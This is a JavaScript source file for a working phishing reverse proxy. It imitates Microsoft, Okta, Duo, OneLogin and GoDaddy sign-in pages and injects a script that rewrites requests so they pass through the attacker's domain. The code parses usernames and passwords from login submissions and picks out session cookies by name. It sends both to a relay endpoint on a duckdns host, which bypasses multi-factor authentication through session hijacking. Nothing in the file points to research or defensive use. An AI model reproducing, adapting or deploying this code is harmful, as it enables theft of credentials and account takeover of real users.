export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Auth tokens to capture (from Evilginx config)
const AUTH_TOKENS = {
  'login.microsoftonline.com': ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'esctx', 'CCState', 'buid', 'fpc'],
  'login.live.com': ['ESTSAUTH', 'ESTSAUTHPERSISTENT'],
  'account.live.com': ['MSAAuth', 'MSAAuthP'],
  'office.com': ['O365', 'OfficeSession'],
  'sso.godaddy.com': ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

// URLs that indicate successful authentication
const AUTH_URLS = [
  '/kmsi',
  '/common/federation/OAuth2Echo',
  '/common/instrumentation/OAuth2Echo',
  '/common/instrumentation/OAuth2',
  '/oauth2/authorize',
  '/landingv2',
  '/landing',
  '/mail',
  '/calendar',
  '/onedrive'
];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  
  let modified = false;
  while (params.has('path')) {
    params.delete('path');
    modified = true;
  }
  
  for (const [key, value] of params) {
    if (!value || value === 'undefined' || value === 'null') {
      params.delete(key);
    }
  }
  
  const result = params.toString();
  return result ? '?' + result : '';
}

// ==================== CRITICAL FIX: ADVANCED URL PARSER ====================

/**
 * Parse complex recursive URLs like:
 * /_p/ayola-ozamu.zeabur.app/_p/login.microsoftonline.com/common/https:/ayola-ozamu.zeabur.app/kmsi
 * 
 * Returns the deepest valid upstream and remaining path
 */
function parseRecursiveUrl(pathname) {
  // Remove leading slash if present
  let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  
  // Pattern to match: _p/domain.com/...
  const segmentPattern = /^_p\/([^\/]+)(\/.*)?$/;
  
  let segments = [];
  let remaining = path;
  
  // Extract all nested _p segments
  while (remaining) {
    const match = remaining.match(segmentPattern);
    if (!match) break;
    
    const domain = match[1];
    remaining = match[2] || '';
    
    // Skip if it's our own domain (recursive)
    if (domain === YOUR_DOMAIN || domain.endsWith(YOUR_DOMAIN)) {
      continue;
    }
    
    segments.push({ domain, path: remaining });
  }
  
  // Return the last (deepest) valid segment
  if (segments.length > 0) {
    const deepest = segments[segments.length - 1];
    return {
      upstream: deepest.domain,
      path: deepest.path || '/',
      isProxied: true,
      cleaned: `/_p/${deepest.domain}${deepest.path || '/'}`
    };
  }
  
  return null;
}

function getUpstreamInfo(pathname, search) {
  // Try advanced parser first (handles recursive URLs)
  const parsed = parseRecursiveUrl(pathname);
  
  if (parsed) {
    const provider = IDENTITY_PROVIDERS[parsed.upstream];
    
    return {
      upstream: parsed.upstream,
      type: provider ? provider.type : 'unknown',
      path: parsed.path,
      search: cleanQueryString(search),
      isProxied: true
    };
  }
  
  // Standard parsing for non-recursive paths
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const firstSlash = withoutPrefix.indexOf('/');
    
    let upstreamDomain;
    let upstreamPath;
    
    if (firstSlash === -1) {
      upstreamDomain = withoutPrefix;
      upstreamPath = '/';
    } else {
      upstreamDomain = withoutPrefix.slice(0, firstSlash);
      upstreamPath = withoutPrefix.slice(firstSlash);
    }
    
    // Block self-proxying
    if (upstreamDomain === YOUR_DOMAIN || upstreamDomain.endsWith(YOUR_DOMAIN)) {
      console.log(`[BLOCKED] Self-proxy attempt: ${upstreamDomain}`);
      return {
        upstream: INITIAL_UPSTREAM,
        type: 'microsoft',
        path: '/',
        search: '',
        isProxied: false,
        isBlocked: true
      };
    }
    
    const provider = IDENTITY_PROVIDERS[upstreamDomain];
    
    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      search: cleanQueryString(search),
      isProxied: true
    };
  }
  
  // Default: serve initial upstream
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    search: cleanQueryString(search),
    isProxied: false
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

// ==================== LOCATION REWRITING ====================

function rewriteLocation(location, currentUpstream) {
  try {
    const url = new URL(location);
    
    // Already our domain? Check for embedded paths
    if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
      // Check if path contains embedded upstream
      // e.g., /common/https://ayola-ozamu.zeabur.app/kmsi
      const embeddedMatch = url.pathname.match(/\/https?:\/\/([^\/]+)(.*)/);
      if (embeddedMatch) {
        const embeddedHost = embeddedMatch[1];
        const embeddedPath = embeddedMatch[2] || '/';
        
        // If embedded host is us, extract the path and proxy through current upstream
        if (embeddedHost === YOUR_DOMAIN) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${embeddedPath}${url.search}`;
        }
      }
      
      // Already proxied or root path
      return location;
    }
    
    // External domain - proxy it
    if (shouldProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanQueryString(url.search)}`;
    }
    
    return location;
    
  } catch (e) {
    // Relative URL
    if (location.startsWith('/') && currentUpstream) {
      // Check for embedded protocol
      const embeddedMatch = location.match(/\/https?:\/\/([^\/]+)(.*)/);
      if (embeddedMatch) {
        const embeddedHost = embeddedMatch[1];
        const embeddedPath = embeddedMatch[2] || '/';
        
        if (embeddedHost === YOUR_DOMAIN) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${embeddedPath}`;
        }
      }
      
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${location}`;
    }
    
    return location;
  }
}

// ==================== AUTH DETECTION ====================

function isAuthUrl(path) {
  return AUTH_URLS.some(authPath => path.includes(authPath));
}

function hasAuthCookies(cookieString, upstream) {
  if (!cookieString) return false;
  
  const patterns = AUTH_TOKENS[upstream] || AUTH_TOKENS['login.microsoftonline.com'] || [];
  
  return patterns.some(pattern => {
    const regex = new RegExp(pattern, 'i');
    return regex.test(cookieString);
  });
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  // Try JSON first
  try {
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login || jsonData.UserName;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass || jsonData.Password;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  // Try form data
  const params = new URLSearchParams(bodyText);
  const userFields = ['login', 'loginfmt', 'username', 'email', 'user', 'UserName'];
  const passFields = ['passwd', 'password', 'pwd', 'pass', 'Password'];
  
  for (const field of userFields) {
    if (params.has(field)) {
      user = params.get(field);
      break;
    }
  }
  
  for (const field of passFields) {
    if (params.has(field)) {
      pass = params.get(field);
      break;
    }
  }
  
  return { user, pass };
}

function generateInterceptorScript(upstreamDomain, currentPath) {
  const basePath = currentPath.replace(/\/[^\/]*$/, '/');
  return `<script>(function(){
    const P='${PROXY_PREFIX}',D='${YOUR_DOMAIN}',U='${upstreamDomain}',B='${basePath}';
    function r(u){
      if(!u)return u;
      if(u.includes(D+P))return u;
      if(u.startsWith('http')){
        try{
          let h=new URL(u).hostname;
          if(['login.microsoftonline.com','login.live.com','office.com','microsoft.com','msauth.net','okta.com','godaddy.com','secureserver.net'].some(d=>h.includes(d)))
            return u.replace(/^https?:\\/\\/[^\\/]+/,'https://'+D+P+h)
        }catch(e){}
      }
      if(u.startsWith('//')){
        let h=u.split('/')[2];
        if(h&&r('https://'+h)!==u)return'https://'+D+P+h+u.slice(2+h.length)
      }
      if(u.startsWith('/')){
        // Handle embedded URLs in path
        const emb=u.match(/\\/https?:\\/\\/([^\\/]+)(.*)/);
        if(emb&&emb[1]===D){
          return'https://'+D+P+U+emb[2];
        }
        return u.startsWith(P)?u:'https://'+D+P+U+u
      }
      return'https://'+D+P+U+B+u
    }
    const f=window.fetch;
    window.fetch=function(u,o){
      try{
        return f.call(this,typeof u==='string'?r(u):u instanceof Request?new Request(r(u.url),u):u,o)
      }catch(e){
        return f.call(this,u,o)
      }
    };
    const x=XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open=function(m,u,a,user,pwd){
      try{
        return x.call(this,m,r(u),a,user,pwd)
      }catch(e){
        return x.call(this,m,u,a,user,pwd)
      }
    };
    const s=HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit=function(){
      if(this.action)this.action=r(this.action);
      return s.call(this)
    };
    document.addEventListener('click',function(e){
      let f=e.target.closest('form');
      if(f&&f.action)f.action=r(f.action)
    },true);
  })();</script>`;
}

// ==================== RESPONSE HANDLING ====================

function createResponseHeaders(resp, options = {}) {
  const newHeaders = new Headers();
  
  // Copy essential headers
  const headersToCopy = [
    'content-type',
    'content-length',
    'content-encoding',
    'cache-control',
    'expires',
    'etag',
    'last-modified',
    'vary'
  ];
  
  headersToCopy.forEach(name => {
    const value = resp.headers.get(name);
    if (value) {
      newHeaders.set(name, value);
    }
  });
  
  // Add CORS headers
  newHeaders.set('access-control-allow-origin', '*');
  newHeaders.set('access-control-allow-credentials', 'true');
  
  // Add custom headers
  if (options.location) {
    newHeaders.set('location', options.location);
  }
  
  if (options.setCookies) {
    options.setCookies.forEach(cookie => {
      newHeaders.append('set-cookie', cookie);
    });
  }
  
  return newHeaders;
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname, url.search);
  
  // Handle blocked self-proxy
  if (info.isBlocked) {
    console.log(`[REDIRECT] Blocked request, redirecting to /`);
    const headers = new Headers();
    headers.set('location', `https://${YOUR_DOMAIN}/`);
    return new Response(null, { status: 302, headers });
  }
  
  const upstreamDomain = info.upstream;
  const upstreamUrl = 'https://' + upstreamDomain + info.path + info.search;
  
  const isAuthEndpoint = isAuthUrl(info.path);
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}${isAuthEndpoint ? ' [AUTH]' : ''}`);

  // Prepare request headers
  const headers = new Headers();
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
  
  clientHeaders.forEach(h => {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  });

  headers.set('Host', upstreamDomain);
  
  if (!request.headers.get('referer')) {
    headers.set('Referer', 'https://' + upstreamDomain + '/');
  }
  if (!request.headers.get('origin')) {
    headers.set('Origin', 'https://' + upstreamDomain);
  }

  // Remove hop-by-hop headers
  ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'].forEach(h => headers.delete(h));

  let bodyText = null;
  let requestBody = null;

  // Handle credential extraction for POST requests
  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] ${user.substring(0,5)}... on ${info.type}`);
        await sendToVercel('credentials', { 
          type: 'creds', 
          ip, 
          user, 
          pass, 
          platform: info.type, 
          url: url.href 
        });
        
        // Also send as file
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        formData.append('ip', ip);
        formData.append('type', 'credentials');
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const rewrittenLoc = rewriteLocation(loc, upstreamDomain);
        console.log(`[REDIRECT] ${loc} -> ${rewrittenLoc}`);
        const redirectHeaders = createResponseHeaders(resp, { location: rewrittenLoc });
        return new Response(null, { status: resp.status, headers: redirectHeaders });
      }
    }

    // Process cookies
    const cookies = resp.headers.getSetCookie?.() || [];
    let cookieStr = '';
    const modifiedCookies = [];
    let shouldCapture = false;

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      
      // Check if this is an auth response
      const hasAuth = hasAuthCookies(cookieStr, upstreamDomain);
      const isPostLogin = request.method === 'POST' && (info.path.includes('/login') || info.path.includes('/ProcessAuth'));
      const isAuthRedirect = resp.status === 302 && isAuthUrl(info.path);
      
      shouldCapture = isPostLogin || isAuthRedirect || (isAuthEndpoint && hasAuth);

      console.log(`[COOKIES] ${cookies.length} cookies, auth=${hasAuth}, capture=${shouldCapture}`);

      cookies.forEach(cookie => {
        if (!cookie) return;
        
        let modifiedCookie = cookie;
        
        // Replace domain in cookie
        modifiedCookie = modifiedCookie.replace(
          new RegExp(`domain=${upstreamDomain.replace(/\./g, '\\.')}`, 'gi'),
          `domain=${YOUR_DOMAIN}`
        );
        
        // Replace upstream domain in path/value if present
        modifiedCookie = modifiedCookie.replace(
          new RegExp(upstreamDomain.replace(/\./g, '\\.'), 'g'),
          `${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}`
        );
        
        // Ensure Secure and SameSite
        if (!modifiedCookie.toLowerCase().includes('secure')) modifiedCookie += '; Secure';
        if (!modifiedCookie.toLowerCase().includes('samesite')) modifiedCookie += '; SameSite=None';
        
        modifiedCookies.push(modifiedCookie);
      });
    }

    // Capture auth cookies
    if (shouldCapture && cookieStr) {
      console.log(`[EXFILTRATING] Cookies for ${info.type}`);
      await exfiltrateCookies(cookieStr, ip, info.type, url.href);
    }

    // Create response headers
    const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });

    // Process body for HTML/JS/CSS
    const ct = resp.headers.get('content-type') || '';
    
    if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
      let text = await resp.text();
      
      // Inject interceptor script for HTML
      if (ct.includes('text/html')) {
        const script = generateInterceptorScript(upstreamDomain, info.path);
        text = text.replace('<head>', '<head>' + script)
                   .replace('<html>', '<html>' + script);
        if (!text.includes(script)) text = script + text;
      }

      // Rewrite all upstream domains in content
      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
        text = text.split(domain).join(replacement);
      });

      // Handle relative paths in HTML
      if (ct.includes('text/html')) {
        const currentDir = info.path.replace(/\/[^\/]*$/, '/');
        
        // src/href attributes
        text = text.replace(/(src|href)="\/([^"]*)"/gi, (m, attr, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:')) return m;
          return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path}"`;
        });
        
        // Form actions
        text = text.replace(/action="\/([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
        text = text.replace(/action="(?!\/|https?:|#|data:)([^"]*)"/gi, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${currentDir}$1"`);
        
        // CSS url()
        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (m, path) => {
          if (path.startsWith('_p/')) return m;
          return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${path})`;
        });
      }

      return new Response(text, { status: resp.status, headers: responseHeaders });
    }

    // Binary/streaming response
    return new Response(resp.body, { status: resp.status, headers: responseHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    const errorHeaders = new Headers();
    errorHeaders.set('content-type', 'application/json');
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }), 
      { status: 502, headers: errorHeaders }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
